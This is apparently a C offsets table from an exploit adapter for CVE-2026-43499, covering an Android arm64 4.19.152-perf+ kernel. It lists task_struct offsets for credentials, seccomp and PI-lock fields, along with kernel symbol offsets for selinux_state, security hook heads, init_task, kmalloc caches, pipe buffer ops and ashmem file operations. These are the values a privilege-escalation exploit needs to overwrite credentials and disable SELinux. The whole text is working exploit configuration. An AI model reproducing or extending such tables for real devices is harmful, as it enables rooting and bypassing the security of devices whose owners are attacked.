/* Custom 4.19.152-perf+ — Android arm64 kernel
 * Extracted from kernel.elf by CVE-2026-43499 exploit adapter
 * KIMAGE_TEXT_BASE=0xffffff8008000000, _text=0xffffff8008080000
 * All offsets are relative to KIMAGE_TEXT_BASE
 * Missing symbols (=0) are resolved via kallsyms_lookup_name at runtime */
#define STRUCT_OFFSETS_4_19 \
  .task_prio=0xAC, .task_normal_prio=0xB4, .task_sched_task_group=0x418, \
  .task_pi_lock=0x8B8, .task_pi_waiters=0x8CC, \
  .task_pi_top_task=0x8DC, .task_pi_blocked_on=0x8E4, \
  .task_pid=0x5D4, .task_tgid=0x5D8, .task_real_parent=0x5E0, \
  .task_atomic_flags=0x598, .task_real_cred=0x780, .task_cred=0x788, \
  .task_comm=0x798, .task_tasks=0x4D0, .task_seccomp=0x850, \
  .mm_owner=0x350, .waiter_compact=1

OFFSETS_ENTRY("4.19.152-perf+",
  .kernel_phys_load=0,
  .kimage_text_base=0xffffff8008000000ULL,
  STRUCT_OFFSETS_4_19,
  .off_init_task=0x2E00000,
  .off_init_cred=0,
  .off_init_uts_ns=0x2E1FFC8,
  .off_empty_zero_page=0x30EB000,
  .off_root_task_group=0x30F21C0,
  .off_selinux_enforcing=0xA550420,  /* selinux_state */
  .off_kptr_restrict=0,
  .off_selinux_blob_sizes=0,
  .off_security_hook_heads=0x254FD90,
  .off_kmalloc_caches=0x254F880,
  .off_anon_pipe_buf_ops=0x1D79200,
  .off_ashmem_misc_fops=0,
  .off_ashmem_fops=0x1EF0B10,
  .off_ashmem_ioctl=0xE406F0,
  .off_ashmem_compat_ioctl=0,
  .off_ashmem_mmap=0xE40E70,
  .off_ashmem_open=0xE40FE0,
  .off_ashmem_release=0xE41070,
  .off_ashmem_show_fdinfo=0xE410F8,
  .off_configfs_read_iter=0,
  .off_configfs_bin_write_iter=0,
  .off_copy_splice_read=0x346C28,  /* generic_file_splice_read */
  .off_noop_llseek=0x3020D8,
  .off_cap_capable_active=0,
  .off_slide_nfulnl_logger=0x2E165A8,
  .off_slide_loggers_0_1=0,
  .off_slide_boot_id=0,
  .off_system_unbound_wq=0x2E0DC00,
  .off_call_usermodehelper_exec_work=0,
),